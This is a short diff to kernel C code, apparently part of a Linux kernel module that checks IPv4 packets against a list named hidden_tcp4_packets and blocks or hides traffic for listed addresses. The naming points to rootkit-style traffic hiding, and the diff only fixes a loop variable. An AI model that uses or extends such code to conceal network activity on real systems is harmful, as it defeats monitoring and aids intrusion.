@@ -1031,6 +1031,7 @@ int packet_check(struct sk_buff *skb)
         //static unsigned char *drop_ip = "\x7f\x00\x00\x01";
 	//static u8 *drop_ip = "\x7f\x00\x00\x01";
 	char drop_ip[16] = "127.0.0.1";
+	struct hidden_packet *hp;
 	
 	
 	/* check for ipv4 */
@@ -1061,11 +1062,11 @@ int packet_check(struct sk_buff *skb)
 		pr_info("DEST   %s", dest_ip);
 		
 		
-		list_for_each_entry ( p, &hidden_tcp4_packets, list )
+		list_for_each_entry ( hp, &hidden_tcp4_packets, list )
 		{
 		    //sprintf(port, ":%04X", hp->port);
 
-		    if( (strcmp(source_ip,p->ip) == 0) || (strcmp(dest_ip,p->ip) == 0 ) ) {
+		    if( (strcmp(source_ip,hp->ip) == 0) || (strcmp(dest_ip,hp->ip) == 0 ) ) {
 		    {
 		         //debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
 			pr_info("Detecting packet from IP list. Blocking\n");
